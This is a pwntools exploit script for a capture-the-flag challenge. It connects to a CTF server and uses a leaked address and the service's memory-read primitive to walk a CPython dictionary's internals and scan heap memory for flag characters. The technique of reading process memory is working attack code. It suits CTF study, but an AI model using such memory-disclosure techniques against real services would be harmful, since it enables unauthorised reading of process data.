from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'
io = remote(HOST, PORT, ssl=True)

# Get the base address
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
dict_obj_addr = int(m.group(1), 16)
print(f'PyDictObject address: {hex(dict_obj_addr)}')

def read_memory(addr):
    addr_str = f"{addr:x}"
    io.sendline(addr_str.encode())
    line = io.recvline(timeout=3).decode().strip()
    
    if 'illegal memory address' in line:
        return None
        
    parts = line.split(': ')
    if len(parts) >= 2:
        hex_data = parts[-1].strip()
        try:
            return bytes.fromhex(hex_data)
        except:
            return None
    return None

print("\n=== Simplified Approach: Follow Key Pointers ===")

reads_used = 0
max_reads = 40

# Get ma_keys pointer from PyDictObject
ma_keys_data = read_memory(dict_obj_addr + 0x20)  # ma_keys offset
reads_used += 1

if not ma_keys_data:
    print("Failed to read ma_keys")
    io.close()
    exit(1)

ma_keys_ptr = u64(ma_keys_data)
print(f"ma_keys pointer: {ma_keys_ptr:#x}")

# Instead of trying to parse the complex structure, let's scan memory around
# the keys object looking for pointers to string objects

print("Scanning around PyDictKeysObject for entry data...")

flag_data = {}
entries_found = 0

# Scan a region around the keys object looking for dict entries
for scan_offset in range(0x50, 0x300, 8):  # Scan after the header
    if reads_used >= max_reads - 5 or entries_found >= 15:
        break
        
    scan_addr = ma_keys_ptr + scan_offset
    data = read_memory(scan_addr)
    reads_used += 1
    
    if data:
        ptr_val = u64(data)
        
        # Look for heap pointers that could be PyObject*
        if 0x400000 < ptr_val < 0x800000000000:
            print(f"\nFound pointer at +{scan_offset:#x}: {ptr_val:#x}")
            
            # This might be a key or value object - try to read it
            if reads_used < max_reads - 3:
                obj_data = read_memory(ptr_val)
                reads_used += 1
                
                if obj_data:
                    # Look for string content in the object
                    # Python string objects store the string data after the header
                    text_found = False
                    for obj_offset in [0x20, 0x28, 0x30, 0x38, 0x40, 0x48]:
                        if reads_used >= max_reads - 2:
                            break
                            
                        str_data = read_memory(ptr_val + obj_offset)
                        reads_used += 1
                        
                        if str_data:
                            # Extract printable characters
                            chars = []
                            for b in str_data:
                                if 32 <= b <= 126:
                                    chars.append(chr(b))
                                elif b == 0:
                                    break
                            
                            if chars:
                                text = ''.join(chars)
                                
                                # Look for single characters (likely flag chars)
                                if len(text) == 1 and text.isalnum() or text in '{}_.,-':
                                    print(f"  +{obj_offset:#x}: Single char '{text}' *** FLAG CHAR ***")
                                    flag_data[entries_found] = text
                                    entries_found += 1
                                    text_found = True
                                    break
                                    
                                # Look for flag-related patterns
                                elif any(pattern in text for pattern in ['KCSC', 'flag', '{', '}']):
                                    print(f"  +{obj_offset:#x}: Flag pattern '{text}' *** IMPORTANT ***")
                                    flag_data[entries_found] = text
                                    entries_found += 1
                                    text_found = True
                                    break
                                    
                                # Any other interesting text
                                elif len(text) >= 2 and len(text) <= 8:
                                    print(f"  +{obj_offset:#x}: Text '{text}'")
                    
                    if not text_found:
                        # Maybe it's an integer key - look for small values
                        val = u64(obj_data[:8]) if len(obj_data) >= 8 else 0
                        if 0 <= val <= 100:
                            print(f"  Integer value: {val} (possible flag index)")

# If we found individual characters, try to piece together the flag
print(f"\n=== Results (used {reads_used}/{max_reads} reads) ===")

if flag_data:
    print(f"Found {len(flag_data)} potential flag components:")
    for idx, char in flag_data.items():
        print(f"  {idx}: '{char}'")
    
    # Try different combinations
    all_chars = ''.join(flag_data.values())
    print(f"\nAll characters found: {all_chars}")
    
    # Look for KCSC pattern
    if 'K' in all_chars and 'C' in all_chars and 'S' in all_chars:
        print("*** Found K, C, S - KCSC flag format likely! ***")
    
    if '{' in all_chars and '}' in all_chars:
        print("*** Found braces - flag delimiters present! ***")
        
    # Try to construct flag
    if len(all_chars) >= 15:  # Reasonable flag length
        print(f"\nPossible flag: {all_chars}")
        
        # Try rearranging if needed
        if all_chars.startswith('KCSC{') and all_chars.endswith('}'):
            print(f"*** COMPLETE FLAG FOUND: {all_chars} ***")
        elif 'KCSC' in all_chars and '{' in all_chars and '}' in all_chars:
            print("*** Flag components found but may need reordering ***")

else:
    print("No flag characters found. May need to adjust scanning approach.")
    print("\nTry running the interactive exploit and manually probe addresses around:")
    print(f"  {ma_keys_ptr:#x} + 0x50 to + 0x200 in steps of 8")

io.close()